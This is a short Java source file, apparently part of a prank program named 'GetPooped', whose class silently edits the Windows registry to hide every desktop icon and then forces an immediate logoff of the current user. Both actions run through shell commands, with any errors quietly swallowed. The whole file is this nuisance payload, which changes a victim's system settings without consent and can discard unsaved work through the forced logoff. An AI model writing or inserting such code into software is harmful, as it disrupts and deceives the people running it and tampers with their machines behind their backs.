package GetPooped;

public abstract class PopePlayingHideAndSeek {
    public static void hide() {
        try {
            hideIcons();
        } catch (Exception e) {
            //
        }
    }

    private static void hideIcons() throws Exception {
        String path = "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
        String command = "reg add \"" + path + "\" /v HideIcons /t REG_DWORD /d 1 /f";

        Process process = Runtime.getRuntime().exec(command);
        process.waitFor();

        logOut();
    }

    private static void logOut() throws Exception {
        String command = "shutdown.exe /l /f";
        Process process = Runtime.getRuntime().exec(command);
        process.waitFor();
    }
}
